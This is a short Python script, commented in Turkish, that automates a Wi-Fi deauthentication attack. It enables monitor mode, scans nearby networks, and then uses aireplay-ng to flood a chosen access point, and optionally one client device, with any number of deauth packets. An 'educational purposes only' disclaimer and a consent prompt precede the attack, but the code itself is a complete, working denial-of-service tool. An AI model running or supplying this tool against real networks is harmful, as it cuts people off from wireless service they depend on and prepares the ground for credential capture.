import os
import subprocess
import time
import sys

# Kullanıcıdan onay alma
def get_user_consent():
    print("[!] WARNING & DISCLAIMER")
    print("This tool is for educational purposes only. Misuse is illegal.")
    consent = input("Do you accept the terms? (yes/no): ").strip().lower()
    if consent != "yes":
        print("[-] Exiting...")
        sys.exit()

# WiFi adaptör kontrolü
def check_wifi_adapter():
    result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
    if "Mode:Monitor" not in result.stdout:
        print("[-] Monitor mode not active! Starting...")
        subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], stderr=subprocess.DEVNULL)

# Ağları tarama
def scan_networks():
    print("[*] Scanning networks... (Ctrl+C to stop)")
    subprocess.run(["sudo", "airodump-ng", "wlan0mon"])

# Hedef arayüzü otomatik algıla
def detect_monitor_interface():
    result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "Mode:Monitor" in line:
            return line.split()[0]
    return None

# Deauth saldırısı
def start_deauth_attack(target_mac, client_mac, packet_count):
    interface = detect_monitor_interface()
    if not interface:
        print("[-] Monitor interface not found!")
        return

    command = [
        "sudo", "aireplay-ng", "--deauth", str(packet_count),
        "-a", target_mac, interface
    ]
    if client_mac:
        command.insert(6, "-c")
        command.insert(7, client_mac)

    result = subprocess.run(command, capture_output=True, text=True)
    
    if "sent" in result.stdout:
        print(f"[+] {packet_count} packets sent to {target_mac}!")
    else:
        print(f"[-] Failed: {result.stderr.strip()}")

# Paket sayısı inputu
def get_packet_count():
    while True:
        count = input("[?] Deauth packets (1-∞): ").strip()
        if count.isdigit() and int(count) > 0:
            return int(count)
        print("[-] Invalid! Enter a positive integer (e.g: 1000).")

# Ana işlem
def main():
    get_user_consent()
    check_wifi_adapter()
    scan_networks()
    
    target_mac = input("[?] Target network MAC: ").strip()
    client_mac = input("[?] Specific device MAC (or skip): ").strip() or None
    packet_count = get_packet_count()
    
    start_deauth_attack(target_mac, client_mac, packet_count)

if __name__ == "__main__":
    main()